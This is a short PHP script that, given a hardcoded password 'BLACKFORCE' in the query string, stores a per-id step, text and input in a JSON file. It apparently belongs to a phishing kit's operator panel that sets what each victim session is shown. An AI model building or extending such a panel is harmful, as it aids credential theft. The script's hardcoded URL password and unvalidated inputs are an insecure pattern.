<?php
require_once "../../cors.php";

if (isset($_GET['id']) && isset($_GET['view']) && isset($_GET['text']) && isset($_GET['input']) && isset($_GET['PWD']) && $_GET['PWD'] === 'BLACKFORCE') {

    $id = $_GET['id'];
    $view = $_GET['view'];
    $text = $_GET['text'];
    $input = $_GET['input'];
    $filename = 'actions.json';

    function putAction($filename, $id, $view, $text, $input) {
        // Read existing data from the JSON file
        if (file_exists($filename)) {
            $fileContent = file_get_contents($filename);
            $data = json_decode($fileContent, true);
        } else {
            $data = ["actions" => []];
        }

        // Check if the ID already exists in the actions array
        $exists = false;
        foreach ($data['actions'] as &$action) {
            if ($action['id'] === $id) {
                $action['step'] = $view;
                $action['text'] = $text;
                $action['input'] = $input;
                $exists = true;
                break;
            }
        }

        if (!$exists) {
            // ID does not exist, so add the new action
            $data['actions'][] = [
                "id" => $id,
                "step" => $view,
                "text" => $text,
                "input" => $input,
            ];
        }

        file_put_contents($filename, json_encode($data, JSON_PRETTY_PRINT));
        echo "done";
    }

    putAction($filename, $id, $view, $text, $input);
} else {
    die("HTTP/1.0 400 Bad Request");
}
?>
